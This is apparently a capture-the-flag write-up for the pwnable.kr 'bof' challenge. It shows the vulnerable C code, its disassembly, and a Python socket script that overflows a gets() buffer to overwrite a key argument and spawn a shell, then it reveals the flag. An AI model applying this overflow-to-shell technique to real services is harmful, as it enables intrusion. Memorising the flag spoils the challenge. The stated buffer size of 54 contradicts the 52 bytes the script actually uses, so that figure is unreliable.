#### bof

We're given a code snippet and a binary file.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);   // smash me!
    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

Things will be clearer if we look at the disassembly.

```asm
$ objdump -d bof -M intel
...
0000062c <func>:
 62c:   55                      push   ebp
 62d:   89 e5                   mov    ebp,esp
 62f:   83 ec 48                sub    esp,0x48
 632:   65 a1 14 00 00 00       mov    eax,gs:0x14
 638:   89 45 f4                mov    DWORD PTR [ebp-0xc],eax
 63b:   31 c0                   xor    eax,eax
 63d:   c7 04 24 8c 07 00 00    mov    DWORD PTR [esp],0x78c
 644:   e8 fc ff ff ff          call   645 <func+0x19>
 649:   8d 45 d4                lea    eax,[ebp-0x2c]
 64c:   89 04 24                mov    DWORD PTR [esp],eax
 64f:   e8 fc ff ff ff          call   650 <func+0x24>
 654:   81 7d 08 be ba fe ca    cmp    DWORD PTR [ebp+0x8],0xcafebabe
 65b:   75 0e                   jne    66b <func+0x3f>
 65d:   c7 04 24 9b 07 00 00    mov    DWORD PTR [esp],0x79b
 664:   e8 fc ff ff ff          call   665 <func+0x39>
 669:   eb 0c                   jmp    677 <func+0x4b>
 66b:   c7 04 24 a3 07 00 00    mov    DWORD PTR [esp],0x7a3
 672:   e8 fc ff ff ff          call   673 <func+0x47>
 677:   8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
 67a:   65 33 05 14 00 00 00    xor    eax,DWORD PTR gs:0x14
 681:   74 05                   je     688 <func+0x5c>
 683:   e8 fc ff ff ff          call   684 <func+0x58>
 688:   c9                      leave
 689:   c3                      ret
 ...
 ```

We can calculate the buffer size which turns out to be 54.

```py
import socket
import telnetlib
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('pwnable.kr', 9000))

buf = b'a' * 52
buf += struct.pack('<I', 0xcafebabe)
buf += b'\n'

s.send(buf)
t = telnetlib.Telnet()
t.sock = s
t.interact()
```

Running the script should give us the flag.

```sh
$ python3 solve.py
cat flag
daddy, I just pwned a buFFer :)
```
